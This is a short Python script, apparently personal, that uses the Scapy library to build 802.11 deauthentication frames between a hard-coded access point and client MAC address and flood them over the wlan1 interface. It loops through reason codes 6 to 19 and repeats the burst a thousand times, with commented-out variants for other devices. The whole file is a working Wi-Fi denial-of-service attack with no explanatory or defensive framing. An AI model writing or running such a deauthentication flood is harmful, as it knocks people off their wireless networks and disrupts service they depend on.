from scapy.all import *

one_nord = "BE:DD:85:EF:68:FC"
Error404 = "10:5A:F7:0F:5F:14"
trala = "88:D7:F6:2A:5D:4D"
shabab = "26:18:1D:7C:7A:EB"
self_PC = "A4:C3:F0:8D:2E:67"


# dot11 = Dot11(addr1=one_nord, addr2=shabab, addr3=shabab)
# packet = RadioTap()/dot11/Dot11Deauth(reason=7)

packets = []
ap_bssid = Error404
client_mac = self_PC

# packet = RadioTap() / Dot11(addr1=self_PC, addr2=Error404, addr3=Error404) / Dot11Deauth()

# send the packet
# sendp(packet, inter=0.1, count=1000, iface="wlan1", verbose=1)
for reason_code in range(6, 20):
    deauth_packet1 = RadioTap() / Dot11(type=0,subtype=12, addr1=ap_bssid, addr2=client_mac, addr3=client_mac) / Dot11Deauth(reason=reason_code)
    deauth_packet2 = RadioTap() / Dot11(type=0,subtype=12, addr1=client_mac, addr2=ap_bssid, addr3=ap_bssid) / Dot11Deauth(reason=reason_code)
    packets.append(deauth_packet1)
    packets.append(deauth_packet2)
    
for i in range(1000):
    for packet in packets:
        sendp(packet, count=1, inter=0.1, iface="wlan1")

# sendp(packet, inter=.1, count=10000, iface="wlan1")